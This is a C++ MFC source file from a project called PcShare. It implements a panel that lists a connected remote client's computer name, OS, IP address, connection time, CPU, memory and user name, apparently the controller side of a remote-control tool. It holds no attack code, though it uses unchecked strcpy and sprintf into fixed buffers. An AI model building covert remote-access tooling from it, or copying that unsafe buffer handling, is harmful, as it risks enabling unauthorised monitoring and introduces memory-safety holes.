// MyClientInfoView.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "MyClientInfoView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyClientInfoView

IMPLEMENT_DYNCREATE(CMyClientInfoView, CListView)

CMyClientInfoView::CMyClientInfoView()
{
	pClientItem = NULL;
}

CMyClientInfoView::~CMyClientInfoView()
{
	
}

BEGIN_MESSAGE_MAP(CMyClientInfoView, CListView)
	//{{AFX_MSG_MAP(CMyClientInfoView)
	ON_WM_CREATE()
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_RESIZE_WND,OnResizeWnd)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyClientInfoView drawing

void CMyClientInfoView::OnDraw(CDC* pDC)
{
//	CDocument* pDoc = GetDocument();
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CMyClientInfoView diagnostics

#ifdef _DEBUG
void CMyClientInfoView::AssertValid() const
{
	CListView::AssertValid();
}

void CMyClientInfoView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMyClientInfoView message handlers

int CMyClientInfoView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CListView::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	GetListCtrl().SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_imagelist.Create(16, 16,ILC_COLOR8|ILC_MASK,5,5);
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_INFO_IDIO));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_INFO_HARD));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_INFO_NET));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_INFO_USER));
	GetListCtrl().SetImageList(&m_imagelist,LVSIL_SMALL);
	GetListCtrl().ModifyStyle(0,LVS_REPORT|LVS_SINGLESEL);
	GetListCtrl().InsertColumn(0,"属性名称",LVCFMT_LEFT,0);
	GetListCtrl().InsertColumn(1,"属性描述",LVCFMT_LEFT,0);
	SetTimer(100,200,NULL);
	GetListCtrl().GetHeaderCtrl()->ModifyStyle(HDS_BUTTONS , HDS_HOTTRACK);
	return 0;
}

void CMyClientInfoView::SetMyItem(LPCLIENTITEM ClientItem)
{
	pClientItem = ClientItem;
	GetListCtrl().DeleteAllItems();

	GetListCtrl().InsertItem(0,"计算机名称",0);
	GetListCtrl().InsertItem(1,"操作系统",0);
	GetListCtrl().InsertItem(2,"连接IP地址",2);
	GetListCtrl().InsertItem(3,"登录时间",2);
	GetListCtrl().InsertItem(4,"连接时长",2);
	GetListCtrl().InsertItem(5,"CPU主频",1);
	GetListCtrl().InsertItem(6,"CPU数量",1);
	GetListCtrl().InsertItem(7,"物理内存容量",1);
	GetListCtrl().InsertItem(8,"内部标识",1);
	GetListCtrl().InsertItem(9,"当前用户名称",3);

	GetListCtrl().SetItemText(0,1,pClientItem->m_SysInfo.m_PcName);
	char m_Text[128] = {0};
	switch(pClientItem->m_SysInfo.m_SysType)
	{
		case Windows32s : strcpy(m_Text,"Microsoft Windows32s");break;
		case WindowsNT3 : strcpy(m_Text,"Microsoft WindowsNT3");break;
		case Windows95 : strcpy(m_Text,"Microsoft Windows95");break;
		case Windows98 : strcpy(m_Text,"Microsoft Windows98");break;
		case WindowsME : strcpy(m_Text,"Microsoft WindowsME");break;
		case WindowsNT4 : strcpy(m_Text,"Microsoft WindowsNT4");break;
		case Windows2000 : strcpy(m_Text,"Microsoft Windows2000");break;
		case WindowsXP : strcpy(m_Text,"Microsoft WinXp");break;
		default: strcpy(m_Text,"未知操作系统");break;
	}
	GetListCtrl().SetItemText(1,1,m_Text);

	sockaddr_in	m_addr = {0};
	int			addrlen = sizeof(sockaddr_in);
	getpeername(pClientItem->m_WorkSocket,(sockaddr*) &m_addr,&addrlen);
	GetListCtrl().SetItemText(2,1,inet_ntoa(m_addr.sin_addr));
	CTime t(pClientItem->m_LoginTime);
	strcpy(m_Text,(LPCTSTR) t.Format("%H:%M:%S"));
	GetListCtrl().SetItemText(3,1,m_Text);
	CTime t_Cur = CTime::GetCurrentTime();
	CTimeSpan t_Sum = t_Cur - t;
	strcpy(m_Text,(LPCTSTR) t_Sum.Format("%H:%M:%S"));
	GetListCtrl().SetItemText(4,1,m_Text);
	sprintf(m_Text,"~%d Mhz",pClientItem->m_SysInfo.m_CpuSpeed);
	GetListCtrl().SetItemText(5,1,m_Text);
	sprintf(m_Text,"%d 个",pClientItem->m_SysInfo.m_CpuCount);
	GetListCtrl().SetItemText(6,1,m_Text);
	
	sprintf(m_Text,"%d KB",pClientItem->m_SysInfo.m_MemContent);
	GetListCtrl().SetItemText(7,1,m_Text);

	GetListCtrl().SetItemText(8,1,pClientItem->m_SysInfo.ID);
	GetListCtrl().SetItemText(9,1,pClientItem->m_SysInfo.m_UserName);
}

BOOL CMyClientInfoView::PreCreateWindow(CREATESTRUCT& cs) 
{
	cs.style ^= LVS_REPORT|LVS_SINGLESEL;	
	return CListView::PreCreateWindow(cs);
}

void CMyClientInfoView::IsCurItem(LPCLIENTITEM ClientItem)
{
	if(pClientItem == ClientItem)
		Empty();
}

void CMyClientInfoView::Empty()
{
	GetListCtrl().DeleteAllItems();
	pClientItem = NULL;
}

LRESULT CMyClientInfoView::OnResizeWnd(WPARAM wParam,LPARAM lParam)
{
	CRect rect;
	GetClientRect(&rect);
	if(rect.Width() > 0)
	{
		GetListCtrl().SetColumnWidth(0,100);
		GetListCtrl().SetColumnWidth(1,rect.Width() - 100);
	}
	return TRUE;
}

void CMyClientInfoView::OnTimer(UINT nIDEvent) 
{
	if(pClientItem == NULL ||
		GetListCtrl().GetItemCount() == 0)
		return;

	char m_Text[128] = {0};
	CTime t(pClientItem->m_LoginTime);
	strcpy(m_Text,(LPCTSTR) t.Format("%H:%M:%S"));
	GetListCtrl().SetItemText(3,1,m_Text);
	CTime t_Cur = CTime::GetCurrentTime();
	CTimeSpan t_Sum = t_Cur - t;
	strcpy(m_Text,(LPCTSTR) t_Sum.Format("%H:%M:%S"));
	if(GetListCtrl().GetItemText(4,1) != m_Text)
		GetListCtrl().SetItemText(4,1,m_Text);
}